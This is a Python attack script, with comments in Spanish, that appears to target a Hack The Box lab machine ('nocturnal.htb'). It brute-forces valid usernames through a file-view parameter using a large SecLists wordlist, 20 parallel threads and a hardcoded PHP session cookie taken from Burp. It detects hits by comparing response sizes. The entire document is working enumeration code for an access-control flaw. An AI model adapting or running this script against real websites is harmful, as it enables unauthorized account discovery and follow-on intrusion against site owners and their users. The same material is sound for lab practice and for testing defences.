import requests
from concurrent.futures import ThreadPoolExecutor

# URL base
base_url = "http://nocturnal.htb/view.php?file=lalo.pdf&username="

# Cabeceras HTTP igual que en Burp
headers = {
    "Host": "nocturnal.htb",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "identity",  # <- NO pedir gzip para que no comprima la respuesta
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}

# Cookies igual que en Burp
cookies = {
    "PHPSESSID": "77r693n6ulqirjfst85oehchm5"  # <-- pon tu cookie actualizada aquí si cambia
}

# Archivo de usuarios
user_list = "/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt"

# Leemos la lista con manejo de errores
users = []
try:
    with open(user_list, "r", encoding="ISO-8859-1") as file:
        for line in file:
            users.append(line.strip())
except Exception as e:
    print(f"[!] No se pudo abrir el archivo {user_list}: {e}")
    exit(1)

print(f"[*] Empezando enumeración con {len(users)} usuarios...\n")

# Primero hacemos una solicitud de control para saber el tamaño "invalido"
try:
    prueba_url = base_url + "usuarioinexistente"
    response = requests.get(prueba_url, headers=headers, cookies=cookies, allow_redirects=True)
    size_invalido = len(response.content)
    print(f"[*] Tamaño de respuesta para usuario inválido: {size_invalido} bytes\n")
except Exception as e:
    print(f"[!] Error al hacer la prueba inicial: {e}")
    exit(1)

# Función que realiza la solicitud HTTP
def check_user(user):
    url = base_url + user
    try:
        response = requests.get(url, headers=headers, cookies=cookies, allow_redirects=True)
        
        print(f"[*] Probando usuario: {user}")
	

        if response.status_code == 200:
            size_actual = len(response.content)
            if size_actual != size_invalido:
                print(f"[+] Usuario válido encontrado: {user} (tamaño respuesta: {size_actual})")
    except Exception as e:
        print(f"[-] Error con el usuario {user}: {e}")

# Ejecutar en paralelo
with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(check_user, users)

print("\n[*] Enumeración terminada.")
